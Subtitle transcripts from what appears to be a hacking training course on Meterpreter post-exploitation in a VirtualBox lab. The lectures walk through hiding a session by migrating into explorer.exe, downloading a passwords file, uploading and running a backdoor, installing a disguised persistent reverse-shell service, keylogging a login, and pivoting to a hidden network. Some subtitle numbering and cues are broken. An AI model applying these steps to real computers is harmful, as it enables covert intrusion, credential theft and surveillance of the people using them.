# Section 17: Post Exploitation - Meterpreter

1

00:00:03,140  -->  00:00:10,020
In today's lecture, we're going to learn some basics about how to interact with Metasploit's meterpreter.

2

00:00:11,860  -->  00:00:15,880
So, I already have a session here and as you can see it just says meterpreter.

3

00:00:16,860  -->  00:00:22,620
In Linux in everything in every command line the 'help' command is always the best command you can run.

4

00:00:22,620  -->  00:00:25,420
So the first thing we're going to do we're gonna do a 'help'...

5

00:00:28,300  -->  00:00:32,240
and as you can see you get a big list of all the commands that you can run

6

00:00:32,600  -->  00:00:36,240
and a description of what each of these commands do.

7

00:00:40,540  -->  00:00:43,240
So, I'm going to show you some basics right now.

8

00:00:43,340  -->  00:00:46,680
The first thing that I wanna show you is the 'background' command.

9

00:00:46,980  -->  00:00:54,880
So 'background' will basically backgrounds the current session, so I won't terminate the session

10

00:00:54,880  -->  00:00:59,680
it'll just, it's very similar to minimize in a window, so when I run background

11

00:00:59,680  -->  00:01:04,800
I'll go back to Metasploit as you can see there and I can run other Metasploit exploits

12

00:01:04,800  -->  00:01:09,040
to further exploit the target machine or just to exploit other machines

13

00:01:09,100  -->  00:01:13,280
while maintaining my connection to the computer that I just hacked.

14

00:01:15,220  -->  00:01:21,100
So, to see a list of all the computers or the sessions that we have we can just run sessions...

15

00:01:22,920  -->  00:01:28,800
'l' to list the current sessions and as you can see we have a session here meterpreter,

16

00:01:28,800  -->  00:01:34,540
so it's still there, we didn't lose it and it's between our device and the target device which is 206.

17

00:01:35,080  -->  00:01:39,720
Now, in order, if I want to get back into that session to interact with the meterpreter again,

18

00:01:39,960  -->  00:01:42,440
all I need to do is run sessions again...

19

00:01:44,880  -->  00:01:51,120
minus 'I' for interact and then I'm gonna put number 2 which is the ID of this session.

20

00:01:53,880  -->  00:01:57,340
and as you can see I'm back in the meterpreter session.

21

00:02:00,220  -->  00:02:04,740
Another command that I want to show you is the 'sysinfo' and you've seen me around this

22

00:02:04,740  -->  00:02:08,160
every time I hack into a system and the reason for this command,

23

00:02:08,160  -->  00:02:11,480
it shows you information about the target computer.

24

00:02:11,480  -->  00:02:19,380
So, it shows us the computer name right here, we can see the operating system of the target computer

25

00:02:19,380  -->  00:02:25,100
and surrounding Windows 10, we can see the architecture, so it's a 64-bit computer so that

26

00:02:25,100  -->  00:02:30,700
if in the future if you wanted to run some executable's on that target we know it's a 64-bit

27

00:02:30,700  -->  00:02:37,020
and we create 64-bit executable's, we can see that the language is English the workgroup

28

00:02:37,020  -->  00:02:44,400
that it's working on and the user ID that's logged in and we can see the version of meterpreter

29

00:02:44,400  -->  00:02:50,060
that's running on the target machine and it's actually a 32-bit version of meterpreter.

30

00:02:51,240  -->  00:02:55,200
Another useful command for gathering our information is 'ipconfig'.

31

00:02:55,920  -->  00:02:59,260
Now 'ipconfig' is very similar to the 'ipconfig' that you get

32

00:02:59,260  -->  00:03:05,000
when you run on the Windows machine on the command prompt and it will show you all the interfaces

33

00:03:05,000  -->  00:03:08,060
that are connected to the target computer.

34

00:03:08,620  -->  00:03:14,720
We can see for example here meter-- Interface 1 we can see the MAC address, we can see the IP address

35

00:03:15,680  -->  00:03:20,580
and for example, here this is the interface that is connected to our network

36

00:03:20,580  -->  00:03:22,720
and the one that we got the connection from.

37

00:03:22,720  -->  00:03:28,300
So, if the device is connected to multiple networks, you'll be able to see all the interfaces

38

00:03:28,300  -->  00:03:30,020
and how to interact with them.

39

00:03:32,480  -->  00:03:37,120
Another useful information gathering command that you can run is 'ps'.

40

00:03:37,740  -->  00:03:43,040
Now, 'ps' will list all the processes that are running on the target computer.

41

00:03:44,000  -->  00:03:47,960
So, these might be background processes or actual programs running

42

00:03:47,960  -->  00:03:50,980
in the foreground as Windows programs or GUI's.

43

00:03:52,040  -->  00:03:55,620
You can see each process here, the name of the process

44

00:03:55,620  -->  00:03:59,500
and then you can see the ID or the PID in which it's running.

45

00:04:01,520  -->  00:04:07,200
An interesting process is the 'explorer.exe' and that's virtually the graphical,

46

00:04:07,200  -->  00:04:14,180
the graphical interface of Windows and we can see that it's running on process ID 2116.

47

00:04:14,660  -->  00:04:19,420
Now a very good idea, once you hack into a system is to migrate the process,

48

00:04:19,420  -->  00:04:25,580
the current process that you're running on into a process that is safer than your current process.

49

00:04:25,580  -->  00:04:30,080
For example, the explorer is the graphical interface of Windows

50

00:04:30,080  -->  00:04:33,720
so it's always running as long as the person is using their device.

51

00:04:33,720  -->  00:04:39,820
So, it's much safer than the process that you gained your access to the computer through.

52

00:04:39,820  -->  00:04:43,320
For example, if you gained your access through an executable or a program,

53

00:04:43,320  -->  00:04:47,360
you will lose your process as soon as the person closes that program.

54

00:04:47,660  -->  00:04:53,820
So, a better way to do is to migrate to a process that is less likely to be closed or
terminated.

55

00:04:54,040  -->  00:04:58,140
So what we're going to do we're going to use a command called 'migrate'

56

00:04:59,860  -->  00:05:05,560
to move our current session into a different process and we're gonna use the explorer process

57

00:05:05,560  -->  00:05:07,060
because it's very safe...

58

00:05:09,740  -->  00:05:16,320
put 2115 and there's no such process obviously, so it should be 2116

59

00:05:19,240  -->  00:05:26,940
and migration is successful now, so on the 'meterpreter' at the moment is running from the 'explorer.exe'.

60

00:05:26,940  -->  00:05:33,700
Now if we go to the Task Manager in the target computer and run my system monitor...

61

00:05:36,960  -->  00:05:39,080
a resource monitor sorry.

62

00:05:41,380  -->  00:05:50,020
Now if we go on Network and going to 'cp' connections you'll see that the connection here on port 8080

63

00:05:50,300  -->  00:05:52,500
is coming from 'explorer.exe'.

64

00:05:52,500  -->  00:05:54,540
So it's not coming from a malicious file.

65

00:05:54,800  -->  00:05:59,200
Our payload or backdoor is actually running through the Explorer.

66

00:05:59,520  -->  00:06:03,680
Now if you see in Firefox or Chrome, you can migrate to that process

67

00:06:03,940  -->  00:06:08,240
and especially that you're connecting through port 8080 or you can use 80,

68

00:06:08,240  -->  00:06:10,960
then it's going to look even less suspicious

69

00:06:10,960  -->  00:06:15,520
because that's 80 and 8080 are the ports used by web servers.

70

00:06:15,800  -->  00:06:21,040
So it's very natural or very normal to have a connection on port 80 or 8080.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,220  -->  00:00:08,500
Now, we're going to learn more commands that will allow us to navigate lists, read, download,

2

00:00:08,500  -->  00:00:12,380
upload and even execute files on the target computer.

3

00:00:13,880  -->  00:00:16,120
So, I have my Meterpreter session right here.

4

00:00:16,740  -->  00:00:22,880
And the first thing that I'm going to do is get my current working directory using the pwd command.

5

00:00:23,520  -->  00:00:26,660
And as you can see, I'm in 'C:\Users' at the moment.

6

00:00:27,320  -->  00:00:31,060
Now, if I want to list all the files and directories, I'm going to use 'ls'.

7

00:00:32,280  -->  00:00:41,180
And let's say that I want to navigate to this file 'IEUser', I'm gonna do 'cd IEUser'.

8

00:00:43,040  -->  00:00:53,820
And if I do 'pwd' now, you'll see that I'm in users, IEUser and let's go into Downloads, list the files.

9

00:00:55,700  -->  00:01:01,900
As you can see now and the files that we listed, we can see a file here called 'passwords.txt',

10

00:01:02,920  -->  00:01:05,560
so this seems like an interesting file.

11

00:01:05,560  -->  00:01:07,680
So, let's see if we want to read this file.

12

00:01:08,140  -->  00:01:15,340
If I wanted to read it, all I have to do is do 'cat' and 'passwords.txt'.

13

00:01:19,940  -->  00:01:24,600
And as you can see, we can see that it contains 'test 1' and 'test 2'.

14

00:01:25,360  -->  00:01:31,880
So, if I go here and run the file, you can see that this is the actual content of the file.

15

00:01:33,500  -->  00:01:37,340
Now, let's say that I really want this file and I want to keep it for later,

16

00:01:37,800  -->  00:01:39,460
then I can download that file.

17

00:01:39,940  -->  00:01:42,240
To do that, we're just going to say 'download'.

18

00:01:44,060  -->  00:01:50,540
And we put the file name which is 'passwords.txt'.

19

00:01:52,500  -->  00:01:57,780
Now, the file has been downloaded successfully and if I go to my root folder,

20

00:01:59,740  -->  00:02:04,700
you'll see that I have a file called 'passwords' and it contains 'test1' and 'test2'.

21

00:02:06,900  -->  00:02:16,540
Let's say that I have a backdoor or a virus or a Trojan or a Keylogger that I want to upload on the target computer,

22

00:02:17,220  -->  00:02:19,360
so I can upload it very easily.

23

00:02:19,360  -->  00:02:25,640
Now, I'll go back to my root actually to show you that I have a file called 'backdoored- calc.exe'.

24

00:02:28,160  -->  00:02:33,280
So, I'm going to try to upload that file and to do that we're just going to run upload.

25

00:02:36,160  -->  00:02:37,260
And we put the filename.

26

00:02:38,960  -->  00:02:39,720
Hit 'Enter'.

27

00:02:41,800  -->  00:02:45,300
And as you can see, now the file has been uploaded successfully.

28

00:02:45,460  -->  00:02:47,880
Now, let's list to make sure that the file exists.

29

00:02:50,460  -->  00:02:54,360
And we can see that we have a new file called 'backdoor-calc.exe'.

30

00:02:57,020  -->  00:03:01,400
And to execute this file on the target computer now, we only uploaded it,

31

00:03:01,840  -->  00:03:07,360
so if it was a virus or a Keylogger and you want to execute it, all you have to do is 'execute'.

32

00:03:09,500  -->  00:03:14,120
And specify the file that you'd like to execute after the 'f' command.

33

00:03:14,700  -->  00:03:21,380
And then type in the name of the file, so in this case, it's  'backdoor-calc.exe'.

34

00:03:24,000  -->  00:03:28,400
And as you can see is showing us that 'Process 3128' has been created,

35

00:03:28,720  -->  00:03:31,680
so my backdoor has been executed.

36

00:03:31,980  -->  00:03:37,580
Now, if this was a virus or anything that you uploaded, it'll do what it's supposed to do

37

00:03:37,700  -->  00:03:40,040
because you just executed that file.

38

00:03:42,040  -->  00:03:45,680
Another feature that I want to show you is 'shell',

39

00:03:45,940  -->  00:03:53,620
which basically, just converts the current Metasploit or Meterpreter session into operating system shell.

40

00:03:54,240  -->  00:03:55,760
So, if I just type in 'shell'.

41

00:03:57,460  -->  00:04:01,520
You'll see, I'll get a Windows prompt or Windows command line

42

00:04:01,720  -->  00:04:03,700
where I can execute Windows commands.

43

00:04:05,880  -->  00:04:09,120
As you can see now, it's on a different channel

44

00:04:09,720  -->  00:04:15,320
and I can run any Windows command that I want through this now,

45

00:04:15,320  -->  00:04:20,360
so I can just do 'dir' to list all directories, I can do 'ipconfig',

46

00:04:22,160  -->  00:04:29,140
or use any Windows command that I want exactly like running the commands through the command prompt .

47

00:04:29,760  -->  00:04:34,040
Now, there is much more commands that you can do for 'File System Management'.

48

00:04:34,340  -->  00:04:38,400
So, if you type in 'help' and you go to the 'File system' section,

49

00:04:40,480  -->  00:04:46,220
you'll see that you can 'edit', you can 'download', we showed that,

50

00:04:46,600  -->  00:04:51,840
you can 'move' a file to another file, it also can be used to 'rename' files,

51

00:04:52,260  -->  00:04:56,740
you can 'delete' files, you can 'remove' directories, you can search,

52

00:04:57,200  -->  00:05:00,700
so there is so many more things that you can do with file system

53

00:05:00,700  -->  00:05:04,080
that was just an overview of the basic or main commands

54

00:05:04,360  -->  00:05:08,520
that you can use with managing the file system of the target computer.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,180 --> 00:00:06,150
And all of the scenarios and videos we've done so far, we would lose our connection to the target computer

2
00:00:06,150 --> 00:00:12,480
as soon as the target person restarts their computer because we used a normal backdoor and once they

3
00:00:12,480 --> 00:00:17,850
restart their computer, our backdoor will be terminated, the process will be terminated and we'll

4
00:00:17,850 --> 00:00:18,930
lose the connection.

5
00:00:19,200 --> 00:00:24,810
So in today's lecture, we're going to talk about methods that will allow us to maintain our access

6
00:00:24,810 --> 00:00:31,950
to the target computer so that we can come back at any time and regain our full control over that computer.

7
00:00:32,250 --> 00:00:34,710
So there's a number of methods to do that.

8
00:00:34,740 --> 00:00:41,370
The first one is use an evasion we can use instead of the normal backdoor, the HTTP backdoor that we

9
00:00:41,370 --> 00:00:42,000
created.

10
00:00:42,000 --> 00:00:45,720
You can use a HTTP service or a TCP service.

11
00:00:45,930 --> 00:00:50,370
So I'll actually show you here if I just run the evasion.

12
00:00:52,210 --> 00:00:53,860
And do a list.

13
00:00:55,000 --> 00:00:59,350
You'll see that we have at number seven right here.

14
00:01:00,590 --> 00:01:05,180
And at number five, we have service factors, so you can use any of them.

15
00:01:05,570 --> 00:01:11,720
If I do use five and we can see them for all you have to do is just set up your l host for the L host

16
00:01:11,720 --> 00:01:13,220
and then generate the back door.

17
00:01:13,220 --> 00:01:17,990
And once you generate it, you can use it and combine it with other stuff and send it to the target

18
00:01:17,990 --> 00:01:19,190
person like we did.

19
00:01:19,190 --> 00:01:25,550
Or you can upload it using the upload command that we learned and then execute it and that will install

20
00:01:25,550 --> 00:01:28,460
the backdoor as a service on the target computer.

21
00:01:28,460 --> 00:01:34,970
So then all you need to do is use the multi handler and any time the target computer starts it'll try

22
00:01:34,970 --> 00:01:39,390
to connect back to you because this is a reverse shell.

23
00:01:39,410 --> 00:01:43,640
Now, I'm not going to be explaining this method because this method is very simple.

24
00:01:43,970 --> 00:01:45,980
We've done something very similar to it before.

25
00:01:45,980 --> 00:01:47,840
We created Backdoor using validation.

26
00:01:47,840 --> 00:01:50,270
So and we upload it self to the direct computer.

27
00:01:50,270 --> 00:01:54,440
So all you have to do is create a backdoor, uploaded, executed and you're done.

28
00:01:54,560 --> 00:01:58,430
Also, it doesn't always work, so that's why I'm not going to be explaining it.

29
00:01:58,430 --> 00:02:00,980
The normal backdoors are much more reliable.

30
00:02:00,980 --> 00:02:07,850
That's why I used a normal, normal backdoor when I was combining it with stuff and changing its icon

31
00:02:07,850 --> 00:02:08,620
and all that.

32
00:02:08,630 --> 00:02:15,680
So we're going to do is we're going to use our backdoor, the normal HTTP reverse interpreter backdoor

33
00:02:15,710 --> 00:02:19,910
that we created in the first video when we created an undetectable backdoor.

34
00:02:19,940 --> 00:02:26,060
We're going to use that and inject that as a service so that it runs every time the target person runs

35
00:02:26,060 --> 00:02:30,530
their computer and tries to connect back to us every certain amount of time.

36
00:02:30,980 --> 00:02:34,820
So to do this, I'm going to background the current session.

37
00:02:34,820 --> 00:02:41,240
So we see that before you can do background and I can still interact with that session on number one

38
00:02:41,600 --> 00:02:43,910
and I'm going to use a module.

39
00:02:45,160 --> 00:02:50,470
So this is like the multi handler module that comes in with Metasploit and it's called Exploit.

40
00:02:51,370 --> 00:02:52,240
Windows.

41
00:02:53,030 --> 00:02:53,900
Local.

42
00:02:54,710 --> 00:02:55,640
Resistance.

43
00:02:57,350 --> 00:03:00,200
Then I'm going to show its options to see what we need to configure.

44
00:03:00,980 --> 00:03:07,480
So the first thing is the amount of seconds that the target will try to connect back to us.

45
00:03:07,490 --> 00:03:10,580
So the interval and I'm going to keep that to 10 seconds.

46
00:03:10,580 --> 00:03:14,330
So every 10 seconds the target computer will try to connect back to me.

47
00:03:14,900 --> 00:03:21,730
Now the name is the name that will show up under the processes where the connection is coming back from.

48
00:03:21,800 --> 00:03:27,590
So I'm going to set that to browser to make it to make it less detectable.

49
00:03:27,590 --> 00:03:32,540
So we're going to set the name to browser the index.

50
00:03:34,640 --> 00:03:39,470
And then the path where the payload or the backdoor will be installed.

51
00:03:39,470 --> 00:03:43,970
I'll leave that the same I'll leave the reg name, the registry entry the same.

52
00:03:44,000 --> 00:03:45,560
Now, this is very important.

53
00:03:45,560 --> 00:03:49,870
You need to specify which session to run this exploit on.

54
00:03:49,880 --> 00:03:54,170
And as you can see now, we were using session number one.

55
00:03:54,170 --> 00:03:56,030
That's our interpreter session.

56
00:03:56,030 --> 00:03:57,590
And if I do sessions.

57
00:03:58,780 --> 00:04:03,520
L It's a list all the available sessions and we can see that it's ID number one.

58
00:04:03,880 --> 00:04:09,040
So what we need to do is we need to set our session here to number one.

59
00:04:09,520 --> 00:04:11,380
So I'm going to do set.

60
00:04:13,760 --> 00:04:17,420
Session two one and the start up.

61
00:04:17,420 --> 00:04:21,630
We're going to leave it for the user person, for the user privileges.

62
00:04:21,710 --> 00:04:23,450
Now let's show the options.

63
00:04:24,330 --> 00:04:26,970
So browser and the session number one.

64
00:04:26,970 --> 00:04:27,860
That's all good.

65
00:04:27,870 --> 00:04:32,580
Now we need to specify the payload that will be injected as a service.

66
00:04:32,700 --> 00:04:37,860
So to do that, we're going to do a show advanced.

67
00:04:38,190 --> 00:04:43,770
So show Advanced will show you advanced options that you can set up for this particular module.

68
00:04:43,980 --> 00:04:47,430
So when I run this, you see I'll get so much more options.

69
00:04:47,430 --> 00:04:50,100
And the one that we're interested in is this one.

70
00:04:50,100 --> 00:04:57,900
So it's called x e custom, which means that we're going to use a custom X to run and inject into the

71
00:04:57,900 --> 00:05:00,150
target computer as a service.

72
00:05:00,720 --> 00:05:03,420
So I'm going to set my x e.

73
00:05:05,190 --> 00:05:11,320
Custom to var w w w html back door.

74
00:05:12,060 --> 00:05:18,950
As you remember, I had that stored in var w w w html back door z.

75
00:05:18,990 --> 00:05:24,900
So I'm going to hit enter and I'm just going to do sho advanced again to make sure that it was set up

76
00:05:24,900 --> 00:05:30,360
properly because sometimes I misspelled things and it's var w w w html back dot dot.

77
00:05:30,720 --> 00:05:31,740
So that's perfect.

78
00:05:31,740 --> 00:05:33,290
Everything is good to go.

79
00:05:33,300 --> 00:05:34,740
I'm going to exploit this.

80
00:05:36,440 --> 00:05:44,660
And that will upload via w w w html factory ex on the target computer using the session that we specified.

81
00:05:44,660 --> 00:05:48,620
Session number one, as you can see now, it's been uploaded and installed.

82
00:05:49,040 --> 00:05:54,590
And one important thing that you need to keep in mind is this resource file, because you can use this

83
00:05:54,590 --> 00:05:57,290
to clean up and delete the back door once you're done.

84
00:05:57,290 --> 00:06:03,020
So if you don't want the back door anymore on the target computer, you can use this file to delete

85
00:06:03,020 --> 00:06:03,620
that door.

86
00:06:03,620 --> 00:06:10,640
So I'm going to start that in a leaf pad here so that I can run it and delete my back door if I wanted

87
00:06:10,640 --> 00:06:12,560
to delete it any time in the future.

88
00:06:13,790 --> 00:06:16,040
If I do sessions l.

89
00:06:17,230 --> 00:06:18,790
I still have my session here.

90
00:06:18,910 --> 00:06:21,700
So what I'm going to do is I'm actually going to kill that session.

91

I'm going to kill all my sessions.

And now if I list, I have no connections with the target computer, as you can see.

00:06:30,510 --> 00:06:36,120
And I'm going to go to use my exploit multi handler.

94
00:06:36,210 --> 00:06:41,550
So I can listen for incoming connections and everything is configured correctly already on this.

95
00:06:41,550 --> 00:06:43,680

But I'm not going to do that now.

99
00:06:56,280 --> 00:07:00,870
I'm actually going to restart the target computer just to show you that I'll always have connection

100
00:07:00,870 --> 00:07:02,520
now with this computer.

101
00:07:02,520 --> 00:07:04,740
So I'm just going to do a normal restart.

102
00:07:09,620 --> 00:07:14,150
So this computer will basically try to connect back to me every 10 seconds.

103
00:07:15,520 --> 00:07:18,360
No matter how many times they restarted, they shut it down.

104
00:07:18,370 --> 00:07:23,710
Every time this computer is running, it will try to connect back to me in every 10 seconds.

105
00:07:23,710 --> 00:07:28,960
So all I have to do is run my interpreter handler and wait for connections.

106
00:07:29,140 --> 00:07:30,490
Now, this computer is running.

107
00:07:30,490 --> 00:07:35,440
As you can see, it doesn't have to be at the start up when I'm listening and I'm just going to do exploit

108
00:07:35,440 --> 00:07:36,400
to listen.

109
00:07:38,510 --> 00:07:41,570
And it will take a maximum of 10 seconds to get a connection back.

110
00:07:41,570 --> 00:07:44,690
And as you can see, I've got a connection to the target computer.

111
00:07:44,690 --> 00:07:50,930
I can do this info and run all the commands that we learned so far and have full access on that computer.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:02,100  -->  00:00:10,200
In this video, we'll see how we can log any mouse or keyboard event that happens on the target computer.

2

00:00:10,820  -->  00:00:15,180
We're gonna do that using a plug-in or a module that comes in with a 'meterpeter'.

3

00:00:15,340  -->  00:00:22,840
So I have my meterpreter here already and to do that all you need to do is just type 'keyscan_start'.

4

00:00:22,840  -->  00:00:26,920
Now all of this exists in the help, if you run the help you'll see it there

5

00:00:26,920  -->  00:00:29,720
and now it starts in my key strike 'Sniffer'.

6

00:00:30,420  -->  00:00:36,500
So I have my Firefox running here and let's say I wanted to go to 'facebook.com'

7

00:00:38,040  -->  00:00:40,200
and then I wanted to login to my--

8

00:00:40,200  -->  00:00:46,120
Now as you can see it's HTTPS here and nothing is wrong about it now let's say I wanted to login

9

00:00:46,120  -->  00:00:51,500
to my account so I'm gonna put my account zaid@isecur1ty.org

10

00:00:51,960  -->  00:00:56,060
and let's say I put my password which is 123456.

11

00:00:56,060  -->  00:00:59,020
Now, obviously this is a wrong password, I'm just trying to show you here.

12

00:00:59,660  -->  00:01:04,660
Now if we come back here to see the log of everything that has been recorded.

13

00:01:04,740  -->  00:01:09,440
We're gonna type in 'keyscan_dump'.

14

00:01:12,440  -->  00:01:18,420
Now as you can see, now we can see that the target person typed in 'facebook.com', hit 'Enter',

15

00:01:18,620  -->  00:01:22,960
then they put their username which is zaid@isecur1ty.org, hit 'Tab'

16

00:01:23,180  -->  00:01:25,820
and then they put the password 123456.

17

00:01:26,380  -->  00:01:29,380
Now this will obviously record everything that happens in there.

18

00:01:30,720  -->  00:01:37,600
What you can also do is we can actually-- Now to stop this you can just do 'keyscan_stop'

19

00:01:37,960  -->  00:01:39,880
and it will stop the 'sniffer'.

20

00:01:40,340  -->  00:01:47,300
Now another cool thing that you can do is you can get a screenshot, so you can just type in screenshot...

21

00:01:51,020  -->  00:01:56,020
If I spelled that right and it will save it here for you in the root.

22

00:01:56,020  -->  00:01:58,140
Now if I go to my browser...

23

00:01:59,600  -->  00:02:04,360
you'll see that I have a screenshot, I believe it's this one

24

00:02:05,620  -->  00:02:10,760
and it's showing you what's here on the target computer you can see it in here.

25

00:02:11,400  -->  00:02:13,589
Now these are just two useful features.

26

00:02:13,589  -->  00:02:17,500
The key login is very useful because you can get usernames and passwords from it

27

00:02:17,500  -->  00:02:19,420
and see what the target person is doing.

28

00:02:19,420  -->  00:02:23,860
The screenshot, you can see them, kind of get an idea of what they're doing as well,

29

00:02:23,860  -->  00:02:27,660
but definitely the keys, the key logger is much more useful.

30

00:02:28,180  -->  00:02:32,860
Now, obviously you can use other keylogger programs like a portable keylogger

31

00:02:32,860  -->  00:02:35,980
and all you have to do is just upload it using the upload command

32

00:02:35,980  -->  00:02:38,480
that we learned before and execute it.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,480  -->  00:00:05,620
In today's lecture and the next few lectures were going to talk about Pivoting.

2

00:00:08,800  -->  00:00:12,980
We're going to assume that our target is this Metasploitable device.

3

00:00:13,900  -->  00:00:18,760
Now each one of these circles, the big circles, we're going to assume is a network

4

00:00:19,340  -->  00:00:24,480
and as you can see the Metasploitable device is not visible by the hacker.

5

00:00:25,080  -->  00:00:30,690
So the hacker cannot see this device, this device is hidden either behind the network

6

00:00:30,900  -->  00:00:38,000
or for some other reason, the hacker is not able to ping or access the IP address of this device.

7

00:00:39,020  -->  00:00:44,980
So we're assuming in our example that it's, it exists in a different internal network,

8

00:00:46,100  -->  00:00:50,640
so we can see that this big network has four devices; it has the meet exploitable device,

9

00:00:50,800  -->  00:00:57,200
it has an iPhone, another device and the Windows device which we hacked and we can see that it's in red.

10

00:00:58,180  -->  00:01:04,740
And the hacker exists in this smaller network and there is only two devices, there is the hacker

11

00:01:04,740  -->  00:01:08,060
and the red device, the Windows 10 device which we hacked.

12

00:01:08,740  -->  00:01:14,940
So the target of Pivoting is we use the device that we hacked, the common device in the middle

13

00:01:14,940  -->  00:01:19,800
to compromise other devices that only this device has access to.

14

00:01:20,280  -->  00:01:25,740
So our target, the hacker cannot see the target which is the Metasploit device

15

00:01:25,740  -->  00:01:30,240
but the device that we just hacked, the Windows device can't see that device

16

00:01:30,240  -->  00:01:31,820
because they're in the same network.

17

00:01:32,520  -->  00:01:36,940
So in our next videos, we're going to try to hack into the Metasploitable device

18

00:01:37,340  -->  00:01:42,040
while the Metasploitable device is not gonna be visible to the hacker,

19

00:01:43,220  -->  00:01:45,760
which is the Kali device.

20

00:01:46,020  -->  00:01:50,160
The only way to access the Metasploitable is through the windows device

21

00:01:50,160  -->  00:01:55,500
which we are going to use as a 'pivot' in order to hack this device right there.

22

00:01:57,000  -->  00:02:03,920
So to set up my networks or my lab, I'm going to go to the VirtualBox settings

23

00:02:05,020  -->  00:02:10,540
and I'm gonna go to the 'Preferences' and I'm gonna go to 'Network'

24

00:02:11,840  -->  00:02:17,200
and we can see that we have this network here that we've been using as the internal NAT network.

25

00:02:17,440  -->  00:02:24,560
This is the one in which my Windows and my Kali devices are connected to the '10.20.14-NAT'.

26

00:02:25,240  -->  00:02:28,740
I'm going to create another NAT network by clicking on the plus here

27

00:02:30,000  -->  00:02:32,340
and we can see that this one is called NAT Network.

28

00:02:32,780  -->  00:02:40,140
Now I'm gonna click on this icon to edit the settings and we can set the network IP

29

00:02:42,200  -->  00:02:50,740
and I'm gonna set it to '10.20'-- The other one was '14' so we'll set this one to '15.0/24'

30

00:02:51,360  -->  00:02:59,460
and I'm gonna change the name so we have the same kind of naming pattern and I'm gonna call it '10.20.'

31

00:03:07,280  -->  00:03:12,320
So we created another Network and the Kali machine is not connected to this network.

32

00:03:14,140  -->  00:03:17,960
Okay, so I'm gonna click 'OK', this network is created.

33

00:03:18,380  -->  00:03:24,980
So I'm going to modify the settings of the Windows device to get it to be connected to the two network,

34

00:03:24,980  -->  00:03:29,660
so the Windows device as we can see in this it's the common device

35

00:03:29,660  -->  00:03:34,400
and it's gonna be connected to the NAT network that the Kali is connected to

36

00:03:34,400  -->  00:03:39,060
and the one that is the Metasploit is connected to, Metasploitable.

37

00:03:39,580  -->  00:03:46,040
So, in my Windows machine, the settings, I'm gonna go to 'Networks' and I'm gonna go to 'Adapter2'

38

00:03:46,580  -->  00:03:52,360
I'm gonna 'Enable' that Adapter and I'm going to connect it to a NAT network

39

00:03:53,140  -->  00:03:56,560
and I'm gonna select the '10.20.15-NAT'.

40

00:03:57,420  -->  00:04:02,220
So the Windows Device now uses two Adapters; one of them is connected to the '14-NAT'

41

00:04:02,220  -->  00:04:04,600
and the other one is connected to the '15-NAT'.

42

00:04:06,940  -->  00:04:13,040
Then I'm gonna go to my 'Metasploitable device', gonna go on the 'Settings', 'Network'

43

00:04:13,940  -->  00:04:17,460
and instead of connecting it to the '10.20.14',

44

00:04:20,620  -->  00:04:23,160
I'm gonna connect it to the '10.20.15'.

45

00:04:24,420  -->  00:04:31,200
So this way the Metasploitable only, is only connected to the network which the windows is connected to

46

00:04:31,200  -->  00:04:35,860
and the Kali is connected to the network which the windows is connected to

47

00:04:35,860  -->  00:04:42,000
and windows is connected to the two common, to the two networks that I have right now in my devices.

48

00:04:42,000  -->  00:04:44,380
So it's connected to this one and this one.

49

00:04:44,860  -->  00:04:49,080
Now to verify that I have the right settings, I'm just gonna start my Metasploitable

50

00:04:49,600  -->  00:04:53,540
and I'm gonna start the windows and I'm just going to do some 'ping' commands

51

00:04:53,540  -->  00:04:56,940
to make sure that everything is set up correctly.

52

00:05:00,340  -->  00:05:06,424
Okay, so my machines have started and the main thing now is my Windows machine

53

00:05:06,424  -->  00:05:11,640
should be able to ping both of my Metasploitable and my Kali.

54

00:05:11,640  -->  00:05:14,460
So let's get the IP of the Metasploitable

55

00:05:16,480  -->  00:05:25,360
and it's '10.20.15.4' so I'm gonna do 'ping '10.20.15.4'

56

00:05:26,980  -->  00:05:31,620
and as you can see now the Windows machine can see the Metasploitable machine.

57

00:05:32,040  -->  00:05:39,820
Now let's see if it can see the Kali machine which is on '14.203'.

58

00:05:41,860  -->  00:05:48,060
and again, so the windows can see both machines, which means that it is the machine in the middle.

59

00:05:48,360  -->  00:05:53,320
Now let's see if the Metasploitable machine can see the Kali machine,

60

00:05:53,320  -->  00:05:56,720
it shouldn't be able to see it because we set the Kali machine

61

00:05:56,720  -->  00:06:01,160
and the Metasploitable machine are connected to the two different networks.

62

00:06:01,500  -->  00:06:09,320
So I'm gonna do 'ping 10.20.14.203'

63

00:06:15,340  -->  00:06:21,680
Now, as you can see now I got nothing and we can see that six packets were transmitted zero received,

64

00:06:21,680  -->  00:06:29,120
so my Metasploitable cannot see the Kali machine and the Kali cannot see the Metasploitable either.

65

00:06:29,460  -->  00:06:35,780
So if I do 'ping 10.20.15.4'...

66

00:06:38,240  -->  00:06:40,960
you'll see that it sent three packets, zero received.

67

00:06:40,960  -->  00:06:46,860
Again, these two devices cannot see each other because they're in two different networks.

68

00:06:47,140  -->  00:06:52,260
So we're gonna do in the next videos is we, we already have an access to the Windows machine

69

00:06:52,260  -->  00:06:58,940
which can see both and we're gonna try to hack into the Metasploit using the Windows machine

70

00:06:58,980  -->  00:07:05,820
that we just hacked into because it's the common machine that is connected to both networks.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,060  -->  00:00:06,260
Now that we understand the concept of pivoting, it's really not that difficult to perform.

2

00:00:06,500  -->  00:00:09,920
All we need to do is we can upload any tool we need to use,

3

00:00:09,920  -->  00:00:16,240
for example, if you wanted to use Nmap or ARP spoof or dSniff, you can upload any of these tools,

4

00:00:16,320  -->  00:00:19,940
run them on this computer which is connected to this big network.

5

00:00:20,140  -->  00:00:22,840
And then you can run a port scanner on this,

6

00:00:22,960  -->  00:00:27,380
you can do ARP poisoning and do man-in-the-middle attacks like we learned before.

7

00:00:27,580  -->  00:00:31,580
So it's very simple, all you have to do is use the upload command,

8

00:00:31,700  -->  00:00:37,620
upload it here and use it from the command line like we were using it, anyway in the previous videos.

9

00:00:38,400  -->  00:00:45,160
What I'm going to show you today is how to set up a route between the hacked computer and your computer,

10

00:00:45,680  -->  00:00:52,020
so that you can use any Metasploit, auxilary or module against this big network.

11

00:00:52,620  -->  00:00:54,940
So, we'll be able to use Metasploit exploits,

12

00:00:54,940  -->  00:01:00,340
we'll be able to use port scanners that come in with Metasploit and other useful modules.

13

00:01:03,800  -->  00:01:07,280
